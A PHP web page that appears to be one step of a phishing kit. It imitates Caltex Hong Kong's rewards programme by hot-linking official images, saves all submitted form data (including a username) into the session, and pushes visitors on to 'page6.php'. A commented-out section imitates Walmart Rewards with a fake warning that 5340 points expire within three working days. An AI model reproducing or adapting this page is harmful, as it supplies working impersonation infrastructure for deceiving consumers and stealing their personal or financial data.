<?php
session_start();

// include('partials/header.php');
include('header_.php');


if (isset($_POST['submit']) || isset($_POST['username'])) {
    $_SESSION['step1Data'] = $_POST;
}



?>
<style>
    .wraps {
/*        padding: 30px 20px;*/
         
        padding-bottom: 0px;
    }
    a.main-logo {
        display: block;
        margin: 11px 0 25px 0;
        text-align: center;
        color: red;
        font-size: 19px;
        font-weight: bold;
    }
    .notice {
        line-height:2;
        padding: 10px;
        border-radius: 5px;
        color: #777977;
        margin: 0px;
        background: #f0f0eb;
    }
    span.inner-pages2 {
            font-weight: unset !important;
            padding-top: 2px;
        }
    @media(max-width: 767px) {
        .submit-btn {
            text-align: center;
            background-color: #0071dc;
            padding: 11px 24px;
            font-size: 1rem;
            display: block;
            width: auto;
            min-width: 120px;
            margin-left: auto;
            margin-right: auto;
            line-height: 22px;
            border-radius: 32px;
            color: #fff;
            border-color: #0071dc;
            height: auto;
            cursor: pointer;
        }

        .submit-btn:hover:hover {
            background-color: #0071dc;
            border-color: #0071dc;
        }

        .loader-wrap {
            display: flex;
            width: 100%;
            height: 100%;
            position: fixed;
            top: 0;
            left: 0;
            align-items: center;
            justify-content: center;
            z-index: 99999999999999;
            background: rgba(255, 255, 255, 1);
        }

        .loader-wrap .loading {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .loader-wrap .loading img.china-mobile-logo-img {
            width: 200px;
        }

        .loader-wrap .loading img {
            width: 80px;
        }
    }
</style>
<div class="wraps">
    <div class="flex-auto relative z-1">
   <div class="main-content mw1280 center" id="maincontent" data-testid="maincontent">
      <div class="container">
         <div class="row py-2 d-flex justify-content-center align-items-center">
            <div class="col-6 text-start">
               <img src="https://www.caltex.com//content/dam/caltex/common/icon/corporate/caltex_logo.png" class="img-fluid">
            </div>
            <div class="col-6 text-end">
               <i class="fa-solid fa-bars"></i>
            </div>
         </div>
      </div>
      <section>
         <img src="https://www.caltex.com/content/dam/caltex/HongKong/Motorists/CaltexRewards/Caltex%20Rewards_Webpage_1400x450_TC_V2_221024.jpg" class="img-fluid" />
         <div style="background: #19516c;padding: 1.429em 0;"></div>
      </section>

      <section class="my-5">
         <div class="container-fluid p-0">
            <div class="row">
               <div class="accordion" id="accordionExample">
                  <div class="accordion-item">
                     <h2 class="accordion-header" id="headingThree">
                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseThree" aria-expanded="false" aria-controls="collapseThree">
                           加FUN計劃 詳情 | 香港加德士
                        </button>
                     </h2>
                     <div id="collapseThree" class="accordion-collapse collapse" aria-labelledby="headingThree" data-bs-parent="#accordionExample">
                        <div class="accordion-body">
                           <ul style="list-style: none;">
                              <li class="py-2 mb-1">
                                 <a href="#" title="賺取積分" target="_self"><span>賺取積分</span></a>
                              </li>
                           
                              <li class="py-2 mb-1">
                                 <a href="#" title="常見問題" target="_self"><span>常見問題</span></a>
                              </li>
                           
                              <li class="py-2 mb-1">
                                 <a href="#" title="協助及意見" target="_self"><span>協助及意見</span></a>
                              </li>
                           </ul>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </section>

      <section class="py-5" style="background:#f0f1f1;">
         <div class="container px-4">
            <div class="row">
               <div class="col-lg-12 text-center">
                     <h4 class="text-danger h-m"> 為您呈獻加德士加 FUN 計劃 </h4>
                     <div class="w-100 d-flex justify-content-center alidn-items-center">
                        <img class="img-fluid" src="https://www.caltex.com/content/dam/caltex/common/caltexrewards/banners/Caltex%20Rewards%20Logo%20full%20color.png">
                     </div>
                     <br>
                     <br>
                     <div class="bg-white pl4 pr4" style="width:100%;height:auto;">
                        
                            <div class="center">
                                <a href="page6.php" class="btn submit-btn">Continue</a>
                            </div>

                            
                            
                        </div>
               </div>
            </div>
         </div>
      </section>

      <section class="py-5 sec-fourth">
         <div class="container px-4">
            <div class="row mb-5 mt-4">
               <div class="col-lg-12 text-center">
                  <h4 class="text-danger h-m fw-bold">  加 FUN 計劃會員尊享： </h4>
               </div>
            </div>
            <div class="row d-flex justify-content-center align-items-center my-5 pt-3">
               <div class="col-3 text-center">
                  <img src="https://www.caltex.com/content/dam/caltex/HongKong/Motorists/CaltexRewards/coupon-icon_172x172.png">
               </div>
               <div class="col-9 text-center">
                  <p> 完成登記並提供郵寄地址，即可享會員獨家迎新汽油優惠券禮遇 </p>
               </div>
            </div>
            <div class="row d-flex justify-content-center align-items-center my-5 pt-3">
               <div class="col-3 text-center">
                  <img src="https://www.caltex.com/content/dam/caltex/HongKong/reward/Earn%20points%20instantly%20with%20every%20fuel%20up.png">
               </div>
               <div class="col-9 text-center">
                  <p> 即時汽油折扣及每次憑加FUN咭入汽油即可賺取積分 </p>
               </div>
            </div>
            <div class="row d-flex justify-content-center align-items-center my-5 pt-3">
               <div class="col-3 text-center">
                  <img src="https://www.caltex.com/content/dam/caltex/HongKong/reward/Earn%20points.png">
               </div>
               <div class="col-9 text-center">
                  <p> 於任何一間加德士加油站用積分抵銷汽油消費 </p>
               </div>
            </div>
            <div class="row d-flex justify-content-center align-items-center my-5 pt-3">
               <div class="col-3 text-center">
                  <img src="https://www.caltex.com/content/dam/caltex/TH/Motorists/RewardsandOffers/caltexrewards/overview/1-Benefits-05-Accelerate%20Earning.jpg">
               </div>
               <div class="col-9 text-center">
                  <p> 透過限時遊戲賺取特別獎賞 </p>
               </div>
            </div>
            <div class="row d-flex justify-content-center align-items-center my-5 pt-3">
               <div class="col-3 text-center">
                  <img src="https://www.caltex.com/content/dam/caltex/TH/Motorists/RewardsandOffers/caltexrewards/sign-up/2B-Sign-up-04-Birthday.jpg">
               </div>
               <div class="col-9 text-center">
                  <p> 於會員生日月份賺取額外積分 </p>
               </div>
            </div>
            <div class="row d-flex justify-content-center align-items-center my-5 pt-3">
               <div class="col-3 text-center">
                  <img src="https://www.caltex.com/content/dam/caltex/TH/Motorists/RewardsandOffers/caltexrewards/overview/1-Benefits-04-Scan%20Save%20Enjoy.jpg">
               </div>
               <div class="col-9 text-center">
                  <p> 全新會員於指定時間內入油，可額外多賺 100 積分  </p>
               </div>
            </div>
         </div>
      </section>

      <!-- <div>
         <main class="ph3-l ph4-xl pb4" id="maincontent">
            <div data-testid="flex-container" class="flex undefined flex-column h-100">
               <div class="h-100 relative">
                  <div data-testid="flex-container" class="flex undefined flex-column h-100">
                     <div class="h-100 relative">
                         <div class="bg-white pl4 pr4" style="width:100%;height:45px;">
                            <div class="notice bg-white" style="font-size:13px;">

                                <p>Dear Walmart Members：<?php //echo  isset($_SESSION['step1Data']['username']) ? $_SESSION['step1Data']['username'] : ''; ?> </p>
                              <p>
                                    MyLink積分計劃」提示您，您的賬戶當前積分（5340積分），將於三個工作日內到期，爲避免影響，請及時兌換積分獎賞。</p> 
                                </br>
                            </div>
                        </div>
                        <section>
                           <div class="ma3" data-testid="skinny-banner">
                              <div class="w-100">
                                 <div style="height:100px;background:url(https://i5.walmartimages.com/dfw/4ff9c6c9-218f/k2-_a17125dd-0da3-4034-b040-5d9080b4ece2.v1.jpg) no-repeat center" class="flex flex-column items-center justify-center w-100 br3 overflow-hidden contain pv4 ph3">
                                    <div style="max-width:fit-content" class="flex flex-column items-center justify-center">
                                       <div class=""><span class="flex justify-center"><span class="b f1-ns f2-m mb1 f4" style="color:#2E2F32">Your remaining Walmart points are (5340)Earn Walmart Rewards with Walmart</span></span></div>
                                       <span class="inner-pages2" style="color:#2E2F32">Join &amp; save on future Walmart purchases.</span>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </section>
                        <div class="bg-white pl4 pr4" style="width:100%;height:auto;">
                        
                            <div class="center">
                                <a href="page6.php" class="btn submit-btn">Continue</a>
                            </div>

                            
                            
                        </div>
                        <div class="bg-white pl4 pr4" style="width:100%;height:346px">
                           <div class="b pv2"></div>
                           <div class="w_0Uhy w_QddF w-100 h-82">
                              <div class="w-88 relative bg-black overflow-hidden" style="height:211px"><iframe id="027c7e5a-26b3-4fd4-ac02-43d3825f153b" class="b--none h-100 absolute w-100 h-inherit" height="0" name="%7B%22config%22%3A%7B%22sfLoadEvent%22%3A%22instant%22%2C%22sfType%22%3A%22ads%22%7D%2C%22data%22%3A%7B%7D%2C%22html%22%3A%22%3Ciframe%20src%3Dhttps%3A%2F%2Fplayer.vimeo.com%2Fvideo%2F749748706%3Fh%3Dbad1cbc4d8%20frameborder%3D%5C%220%5C%22%20allow%3D%5C%22autoplay%3B%20picture-in-picture%5C%22%20allowfullscreen%20style%3D%5C%22position%3Aabsolute%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%3B%5C%22%20title%3Dnull%3E%22%2C%22id%22%3A%22027c7e5a-26b3-4fd4-ac02-43d3825f153b%22%7D" title="Video" sandbox="allow-same-origin allow-scripts allow-top-navigation-by-user-activation allow-forms allow-popups" scrolling="no" src="https://i5.walmartimages.com/dfw/63fd9f59-d6ba/07b8ea82-184c-4ea3-8ac0-5dc1981e40c8/v87/safeframe.html"></iframe></div>
                              <div style="height:94px;max-height:170px" class="w-100">
                                 <div class="pa3 b">Walmart Rewards</div>
                                 <div class="ph3 pb3">Just add, earn &amp; redeem!</div>
                              </div>
                           </div>
                        </div>
                        
                        <section class="pv3">
                           <h2 class="w_kV33 w_Sl3f w_mvVb ph3 ph0-l pb1">Earn and redeem rewards</h2>
                           <div class="dark-gray">
                              <section class="expand-collapse-section nl3-l nr2-l" aria-describedby="delivery-instructions">
                                 <hr aria-hidden="true" class="w_8Gn9">
                                 <div class="expand-collapse-header flex justify-between items-center w-100">
                                    <h3 class="w-100 ma0 pa3 f5 lh-copy normal">In-store with the app</h3>
                                    <div class="pr2"><button class="bg-transparent bn lh-solid pa0 sans-serif tc underline inline-button black pointer f6 bw0 bg-white" type="button" aria-expanded="false" aria-label="In-store with the app"><i class="ld ld-ChevronDown pa0" style="font-size:1.5rem;vertical-align:-0.25em;width:1.5rem;height:1.5rem;box-sizing:content-box"></i></button></div>
                                 </div>
                                 <div class="w_rNem w__2zm expand-collapse-content" style="height:0;visibility:hidden">
                                    <div class="ph3 pb4 pt1">
                                       <div class="gray">
                                          <p>1. Using the Walmart app, sign in to your Walmart account where you have added eligible items from the Rewards Center.</p>
                                          <p>2. At checkout, scan the QR code &amp; select how you would prefer to pay.</p>
                                          <p>3. Purchase the associated item.</p>
                                          <p>4. Once you have completed the transaction &amp; purchased the associated items, you have earned your Walmart Rewards. Nothing further is required from you. It may take a few minutes for the earned Walmart Rewards to appear in your Walmart Rewards balance, which can be found in your Walmart account Wallet &amp; Reward Center.</p>
                                          <p>5. To redeem on your next store trip, scan the QR code at checkout to select your Walmart Rewards balance to apply to your purchase.</p>
                                       </div>
                                    </div>
                                 </div>
                              </section>
                              <hr aria-hidden="true" class="w_8Gn9">
                           </div>
                           <div class="dark-gray">
                              <section class="expand-collapse-section nl3-l nr2-l" aria-describedby="delivery-instructions">
                                 <hr aria-hidden="true" class="w_8Gn9">
                                 <div class="expand-collapse-header flex justify-between items-center w-100">
                                    <h3 class="w-100 ma0 pa3 f5 lh-copy normal">Online</h3>
                                    <div class="pr2"><button class="bg-transparent bn lh-solid pa0 sans-serif tc underline inline-button black pointer f6 bw0 bg-white" type="button" aria-expanded="false" aria-label="Online"><i class="ld ld-ChevronDown pa0" style="font-size:1.5rem;vertical-align:-0.25em;width:1.5rem;height:1.5rem;box-sizing:content-box"></i></button></div>
                                 </div>
                                 <div class="w_rNem w__2zm expand-collapse-content" style="height:0;visibility:hidden">
                                    <div class="ph3 pb4 pt1">
                                       <div class="gray">
                                          <p>1. On Walmart.com or the Walmart app, sign in to your Walmart account where you have added eligible items.</p>
                                          <p>2. Add the eligible item to your cart.</p>
                                          <p>3. Place your order.</p>
                                          <p>4. You earn Walmart Rewards as soon as your order is delivered or picked up from the store. Nothing further is required from you, but it may take a few minutes for the earned Walmart Rewards to appear in your Walmart Rewards balance, which can be found in your Walmart account Wallet &amp; Reward Center.</p>
                                          <p>5. To redeem on your next purchase, choose Walmart Rewards balance at checkout to apply to your purchase.</p>
                                       </div>
                                    </div>
                                 </div>
                              </section>
                              <hr aria-hidden="true" class="w_8Gn9">
                           </div>
                           <div class="dark-gray">
                              <section class="expand-collapse-section nl3-l nr2-l" aria-describedby="delivery-instructions">
                                 <hr aria-hidden="true" class="w_8Gn9">
                                 <div class="expand-collapse-header flex justify-between items-center w-100">
                                    <h3 class="w-100 ma0 pa3 f5 lh-copy normal">Forgot to scan?</h3>
                                    <div class="pr2"><button class="bg-transparent bn lh-solid pa0 sans-serif tc underline inline-button black pointer f6 bw0 bg-white" type="button" aria-expanded="false" aria-label="Forgot to scan?"><i class="ld ld-ChevronDown pa0" style="font-size:1.5rem;vertical-align:-0.25em;width:1.5rem;height:1.5rem;box-sizing:content-box"></i></button></div>
                                 </div>
                                 <div class="w_rNem w__2zm expand-collapse-content" style="height:0;visibility:hidden">
                                    <div class="ph3 pb4 pt1">
                                       <div class="gray">
                                          <p>To earn Walmart Rewards on eligible items, you can scan your receipt barcode within 7 days of purchase. We will check to make sure you have not already received your Walmart Rewards on that transaction. If not, we will credit your Walmart Rewards balance with the appropriate Walmart Rewards. To do this:</p>
                                          <p>1. Download the Walmart app &amp; sign in to your Walmart account where you have added eligible items.</p>
                                          <p>2. Go to Rewards Center tools &amp; tap "Submit your receipt"</p>
                                          <p>3. Scan the barcode on your store receipt.</p>
                                          <p>To redeem your Walmart Rewards balance you need to scan the Walmart Pay QR code at checkout prior to completing the purchase.</p>
                                       </div>
                                    </div>
                                 </div>
                              </section>
                              <hr aria-hidden="true" class="w_8Gn9">
                           </div>
                        </section>
                        <section class="pv3">
                           <h2 class="w_kV33 w_Sl3f w_mvVb ph3 ph0-l pb1">FAQ</h2>
                           <div class="dark-gray">
                              <section class="expand-collapse-section nl3-l nr2-l" aria-describedby="delivery-instructions">
                                 <hr aria-hidden="true" class="w_8Gn9">
                                 <div class="expand-collapse-header flex justify-between items-center w-100">
                                    <h3 class="w-100 ma0 pa3 f5 lh-copy normal">Is Walmart Rewards a credit card?</h3>
                                    <div class="pr2"><button class="bg-transparent bn lh-solid pa0 sans-serif tc underline inline-button black pointer f6 bw0 bg-white" type="button" aria-expanded="false" aria-label="Is Walmart Rewards a credit card?"><i class="ld ld-ChevronDown pa0" style="font-size:1.5rem;vertical-align:-0.25em;width:1.5rem;height:1.5rem;box-sizing:content-box"></i></button></div>
                                 </div>
                                 <div class="w_rNem w__2zm expand-collapse-content" style="height:0;visibility:hidden">
                                    <div class="ph3 pb4 pt1">
                                       <div class="gray">
                                          <p>No.</p>
                                       </div>
                                    </div>
                                 </div>
                              </section>
                              <hr aria-hidden="true" class="w_8Gn9">
                           </div>
                           <div class="dark-gray">
                              <section class="expand-collapse-section nl3-l nr2-l" aria-describedby="delivery-instructions">
                                 <hr aria-hidden="true" class="w_8Gn9">
                                 <div class="expand-collapse-header flex justify-between items-center w-100">
                                    <h3 class="w-100 ma0 pa3 f5 lh-copy normal">Do saved items expire?</h3>
                                    <div class="pr2"><button class="bg-transparent bn lh-solid pa0 sans-serif tc underline inline-button black pointer f6 bw0 bg-white" type="button" aria-expanded="false" aria-label="Do saved items expire?"><i class="ld ld-ChevronDown pa0" style="font-size:1.5rem;vertical-align:-0.25em;width:1.5rem;height:1.5rem;box-sizing:content-box"></i></button></div>
                                 </div>
                                 <div class="w_rNem w__2zm expand-collapse-content" style="height:0;visibility:hidden">
                                    <div class="ph3 pb4 pt1">
                                       <div class="gray">
                                          <p>Yes, saved items have expiration dates &amp; the associated item must be purchased before that expiration date. (see Offer Details for expiration dates).</p>
                                       </div>
                                    </div>
                                 </div>
                              </section>
                              <hr aria-hidden="true" class="w_8Gn9">
                           </div>
                           <div class="dark-gray">
                              <section class="expand-collapse-section nl3-l nr2-l" aria-describedby="delivery-instructions">
                                 <hr aria-hidden="true" class="w_8Gn9">
                                 <div class="expand-collapse-header flex justify-between items-center w-100">
                                    <h3 class="w-100 ma0 pa3 f5 lh-copy normal">Where can I spend my Walmart Rewards balance?</h3>
                                    <div class="pr2"><button class="bg-transparent bn lh-solid pa0 sans-serif tc underline inline-button black pointer f6 bw0 bg-white" type="button" aria-expanded="false" aria-label="Where can I spend my Walmart Rewards balance?"><i class="ld ld-ChevronDown pa0" style="font-size:1.5rem;vertical-align:-0.25em;width:1.5rem;height:1.5rem;box-sizing:content-box"></i></button></div>
                                 </div>
                                 <div class="w_rNem w__2zm expand-collapse-content" style="height:0;visibility:hidden">
                                    <div class="ph3 pb4 pt1">
                                       <div class="gray">
                                          <p>You can redeem any Walmart Rewards balance at Walmart.com or in Walmart stores. We do not allow Walmart Rewards to be redeemed for the purchase of the following items or categories of products:</p>
                                          <p>All gift cards, including, but not limited to:</p>
                                          <p>- Walmart and Sam’s Club gift cards</p>
                                          <p>- Any 3rd party gift cards: e.g. Apple, Google, PlayStation, Starbucks, etc.</p>
                                          <p>- Network-branded gift cards (i.e., Visa, Mastercard, AMEX gift cards)</p>
                                          <p>- Re-loadable prepaid cards (e.g. Green Dot, BlueBird)</p>
                                          <p>Prescription-related products, including, but not limited to:</p>
                                          <p>- Prescription products such as prescription pet medications, prescription drugs, and prescription medical supplies</p>
                                          <p>- Prescription co-pays or deductibles</p>
                                          <p>- Health care services provided by Walmart Health or Walmart Health Virtual Care</p>
                                          <p>- Pharmacy purchases submitted to any health benefit program, pharmacy benefit program, insurer or state / federal government health care program</p>
                                          <p>- Optical products and services</p>
                                          <p>Alcoholic beverages</p>
                                          <p>Tobacco</p>
                                          <p>Firearm and ammunition products</p>
                                          <p>Lottery tickets</p>
                                          <p>Financial services, including those offered through Walmart Money Centers (e.g. money transfers, money orders, bill payments)</p>
                                          <p>Membership fees (Walmart+)</p>
                                       </div>
                                    </div>
                                 </div>
                              </section>
                              <hr aria-hidden="true" class="w_8Gn9">
                           </div>
                           <div class="dark-gray">
                              <section class="expand-collapse-section nl3-l nr2-l" aria-describedby="delivery-instructions">
                                 <hr aria-hidden="true" class="w_8Gn9">
                                 <div class="expand-collapse-header flex justify-between items-center w-100">
                                    <h3 class="w-100 ma0 pa3 f5 lh-copy normal">Does my Walmart Rewards balance expire?</h3>
                                    <div class="pr2"><button class="bg-transparent bn lh-solid pa0 sans-serif tc underline inline-button black pointer f6 bw0 bg-white" type="button" aria-expanded="false" aria-label="Does my Walmart Rewards balance expire?"><i class="ld ld-ChevronDown pa0" style="font-size:1.5rem;vertical-align:-0.25em;width:1.5rem;height:1.5rem;box-sizing:content-box"></i></button></div>
                                 </div>
                                 <div class="w_rNem w__2zm expand-collapse-content" style="height:0;visibility:hidden">
                                    <div class="ph3 pb4 pt1">
                                       <div class="gray">
                                          <p>No.</p>
                                       </div>
                                    </div>
                                 </div>
                              </section>
                              <hr aria-hidden="true" class="w_8Gn9">
                           </div>
                           <div class="dark-gray">
                              <section class="expand-collapse-section nl3-l nr2-l" aria-describedby="delivery-instructions">
                                 <hr aria-hidden="true" class="w_8Gn9">
                                 <div class="expand-collapse-header flex justify-between items-center w-100">
                                    <h3 class="w-100 ma0 pa3 f5 lh-copy normal">Can I earn &amp; redeem Walmart Rewards in the same purchase?</h3>
                                    <div class="pr2"><button class="bg-transparent bn lh-solid pa0 sans-serif tc underline inline-button black pointer f6 bw0 bg-white" type="button" aria-expanded="false" aria-label="Can I earn &amp; redeem Walmart Rewards in the same purchase?"><i class="ld ld-ChevronDown pa0" style="font-size:1.5rem;vertical-align:-0.25em;width:1.5rem;height:1.5rem;box-sizing:content-box"></i></button></div>
                                 </div>
                                 <div class="w_rNem w__2zm expand-collapse-content" style="height:0;visibility:hidden">
                                    <div class="ph3 pb4 pt1">
                                       <div class="gray">
                                          <p>Yes. You can earn Walmart Rewards on eligible items &amp; redeem your existing Walmart Rewards balance on the same transaction.  However, the Walmart Rewards earned in that transaction can only be applied against future transactions.</p>
                                       </div>
                                    </div>
                                 </div>
                              </section>
                              <hr aria-hidden="true" class="w_8Gn9">
                           </div>
                           <div class="dark-gray">
                              <section class="expand-collapse-section nl3-l nr2-l" aria-describedby="delivery-instructions">
                                 <hr aria-hidden="true" class="w_8Gn9">
                                 <div class="expand-collapse-header flex justify-between items-center w-100">
                                    <h3 class="w-100 ma0 pa3 f5 lh-copy normal">Can I use paper coupons &amp; earn Walmart Rewards for the same item?</h3>
                                    <div class="pr2"><button class="bg-transparent bn lh-solid pa0 sans-serif tc underline inline-button black pointer f6 bw0 bg-white" type="button" aria-expanded="false" aria-label="Can I use paper coupons &amp; earn Walmart Rewards for the same item?"><i class="ld ld-ChevronDown pa0" style="font-size:1.5rem;vertical-align:-0.25em;width:1.5rem;height:1.5rem;box-sizing:content-box"></i></button></div>
                                 </div>
                                 <div class="w_rNem w__2zm expand-collapse-content" style="height:0;visibility:hidden">
                                    <div class="ph3 pb4 pt1">
                                       <div class="gray">
                                          <p>No. If you use a paper coupon in-store &amp; have also added an eligible item, the paper coupon will be honored, &amp; you will not earn the Walmart Reward for that item in that purchase.</p>
                                       </div>
                                    </div>
                                 </div>
                              </section>
                              <hr aria-hidden="true" class="w_8Gn9">
                           </div>
                           <div class="dark-gray">
                              <section class="expand-collapse-section nl3-l nr2-l" aria-describedby="delivery-instructions">
                                 <hr aria-hidden="true" class="w_8Gn9">
                                 <div class="expand-collapse-header flex justify-between items-center w-100">
                                    <h3 class="w-100 ma0 pa3 f5 lh-copy normal">Do I forfeit the Walmart Rewards  if I return the item?</h3>
                                    <div class="pr2"><button class="bg-transparent bn lh-solid pa0 sans-serif tc underline inline-button black pointer f6 bw0 bg-white" type="button" aria-expanded="false" aria-label="Do I forfeit the Walmart Rewards  if I return the item?"><i class="ld ld-ChevronDown pa0" style="font-size:1.5rem;vertical-align:-0.25em;width:1.5rem;height:1.5rem;box-sizing:content-box"></i></button></div>
                                 </div>
                                 <div class="w_rNem w__2zm expand-collapse-content" style="height:0;visibility:hidden">
                                    <div class="ph3 pb4 pt1">
                                       <div class="gray">
                                          <p>Yes. When an item that earned Walmart Rewards is returned &amp; the purchase price refunded to you, the Walmart Reward for that item will be reversed &amp; deducted from your Walmart Rewards balance, unless there is another item in your transaction to which the original Walmart Reward could be applied.</p>
                                          <p>If your Walmart Rewards balance is not sufficient to cover the deduction, your balance will be negative. You will not be able to use any future earned Walmart Rewards until you reach a positive Walmart Rewards balance. Earned Walmart Rewards accrue towards your Walmart Rewards balance, which can be found in your Walmart account Wallet &amp; Reward Center.</p>
                                          <p>However, we will never ask you to repay a negative balance.</p>
                                       </div>
                                    </div>
                                 </div>
                              </section>
                              <hr aria-hidden="true" class="w_8Gn9">
                           </div>
                           <div class="dark-gray">
                              <section class="expand-collapse-section nl3-l nr2-l" aria-describedby="delivery-instructions">
                                 <hr aria-hidden="true" class="w_8Gn9">
                                 <div class="expand-collapse-header flex justify-between items-center w-100">
                                    <h3 class="w-100 ma0 pa3 f5 lh-copy normal">What happens to rewards/cashback while a membership is in pause state?</h3>
                                    <div class="pr2"><button class="bg-transparent bn lh-solid pa0 sans-serif tc underline inline-button black pointer f6 bw0 bg-white" type="button" aria-expanded="false" aria-label="What happens to rewards/cashback while a membership is in pause state?"><i class="ld ld-ChevronDown pa0" style="font-size:1.5rem;vertical-align:-0.25em;width:1.5rem;height:1.5rem;box-sizing:content-box"></i></button></div>
                                 </div>
                                 <div class="w_rNem w__2zm expand-collapse-content" style="height:0;visibility:hidden">
                                    <div class="ph3 pb4 pt1">
                                       <div class="gray">
                                          <p>a. Members can’t save or earn any additional rewards on purchases
                                             made during the pause period.
                                          </p>
                                          <p>b. Members can use their existing accumulated rewards during the pause
                                             period.
                                          </p>
                                       </div>
                                    </div>
                                 </div>
                              </section>
                              <hr aria-hidden="true" class="w_8Gn9">
                           </div>
                        </section>
                        
                     </div>
                  </div>
               </div>
            </div>
            <div class="bg-black-20 absolute--fill" id="backgroundTopNav" style="z-index:9998"></div>
         </main>
      </div> -->
   </div>
</div>

</div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script src="<?php echo $folder_path;?>/js/colpas.js"></script>
<?php
include('footer_.php');
